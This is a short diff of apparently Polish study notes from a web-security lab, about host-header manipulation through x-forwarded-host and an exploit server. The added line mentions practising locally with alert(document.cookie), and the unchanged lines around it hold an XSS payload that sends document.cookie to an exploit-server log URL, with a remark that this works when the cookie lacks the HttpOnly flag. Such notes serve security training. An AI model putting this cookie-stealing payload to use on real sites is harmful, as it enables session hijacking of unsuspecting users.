@@ -5,7 +5,7 @@ x-forwarded-host: exploitserver<br>
 <br>
 <img width="1346" height="808" alt="image" src="https://github.com/user-attachments/assets/8ec209af-8724-4122-9c8e-0e9ee6eeb7cd" />
 
-
+najpierw cwicze u siebie z alert(document.cookie);
 <br>
 Fetch zadziała jeśli ciasteczko nie ma flagi HttpOnly<br>
 <script>fetch('https://exploit-xxxx.web-security-academy.net/log?c='+document.cookie)</script>
